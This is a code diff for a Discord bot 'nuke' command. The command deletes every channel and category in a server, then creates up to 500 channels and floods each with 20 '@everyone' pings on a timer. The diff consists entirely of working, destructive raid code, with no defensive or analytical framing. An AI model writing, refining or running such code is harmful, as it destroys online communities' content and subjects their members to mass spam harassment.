@@ -1,56 +1,88 @@
-let isNuking = false;
+let nuking = false;
+let nukeTimeout;
 
 module.exports = {
   name: 'nuke',
-  description: 'Deletes all channels in the server and creates new channels with @everyone mentions.',
-  async execute(message, args, config) {
-    if (isNuking) {
-      return message.reply('A nuke operation is already in progress.');
+  async execute(message, args, config, client) {
+    if (!message.member.permissions.has('ADMINISTRATOR')) {
+      return message.channel.send('You do not have permission to use this command.');
     }
 
-    if (!message.member.hasPermission('MANAGE_CHANNELS')) {
-      return message.reply('You do not have the required permissions to use this command.');
+    if (nuking) {
+      return message.channel.send('Nuke process is already running.');
     }
 
-    const amount = parseInt(args[0], 10);
-    if (isNaN(amount) || amount <= 0 || amount > 100) {
-      return message.reply('Please provide a valid number of channels to create (1-100).');
-    }
+    nuking = true;
 
-    isNuking = true; // Set the flag to indicate nuke operation is ongoing
-
+    // Fetch guild and channels
     const guild = message.guild;
+    await guild.channels.fetch();
 
-    // Delete all channels
-    const channels = guild.channels.cache;
-    for (const channel of channels.values()) {
-      if (!isNuking) break; 
+    // Delete all channels and categories
+    const channelsToDelete = guild.channels.cache.filter(c => c.type === 'GUILD_TEXT' || c.type === 'GUILD_VOICE');
+    const categoriesToDelete = guild.channels.cache.filter(c => c.type === 'GUILD_CATEGORY');
 
-      try {
-        await channel.delete();
-      } catch (error) {
-        console.error(`Failed to delete channel ${channel.name}:`, error);
-      }
-    }
-
-    // Create new channels and send @everyone mentions
-    for (let i = 0; i < amount; i++) {
-      if (!isNuking) break; 
-
-      try {
-        const channel = await guild.channels.create(`channel-${i + 1}`, { type: 'text' });
-        
-        for (let j = 0; j < 20; j++) {
-          if (!isNuking) break; // Stop if the nuke operation was cancelled
-
-          await channel.send(`@everyone This is message number ${j + 1} in channel ${i + 1}`);
+    async function deleteChannelsAndCategories() {
+      // Delete all channels
+      for (const channel of channelsToDelete.values()) {
+        try {
+          await channel.delete();
+          console.log(`Deleted channel ${channel.id}`);
+        } catch (error) {
+          console.error(`Failed to delete channel ${channel.id}:`, error);
         }
-      } catch (error) {
-        console.error(`Failed to create channel ${i + 1}:`, error);
+      }
+
+      // Delete all categories
+      for (const category of categoriesToDelete.values()) {
+        try {
+          await category.delete();
+          console.log(`Deleted category ${category.id}`);
+        } catch (error) {
+          console.error(`Failed to delete category ${category.id}:`, error);
+        }
       }
     }
 
-    isNuking = false; // Reset the flag when done
-    message.reply(`Deleted all channels and created ${amount} new channels with @everyone mentions successfully!`);
-  },
+    await deleteChannelsAndCategories();
+
+    // Now start the nuke process
+    const maxChannels = 500;
+    let createdChannels = 0;
+
+    // Create channels and send @everyone pings
+    async function startNuking() {
+      const interval = setInterval(async () => {
+        if (createdChannels >= maxChannels) {
+          clearInterval(interval);
+          nuking = false;
+          return message.channel.send('Nuke process completed.');
+        }
+
+        // Create a new text channel and send @everyone pings
+        try {
+          const channel = await guild.channels.create(`nuke-channel-${createdChannels + 1}`, {
+            type: 'GUILD_TEXT'
+          });
+
+          for (let i = 0; i < 20; i++) {
+            await channel.send('@everyone');
+          }
+
+          createdChannels++;
+          console.log(`Created and pinged channel ${channel.id}`);
+        } catch (error) {
+          console.error('Failed to create or ping channel:', error);
+        }
+      }, 1000); // Adjust the interval if needed
+    }
+
+    startNuking();
+
+    // Optional: Stop the nuking process after a certain period
+    nukeTimeout = setTimeout(() => {
+      nuking = false;
+      message.channel.send('Nuke process timed out.');
+    }, 5 * 60 * 1000); // 5 minutes timeout
+  }
 };
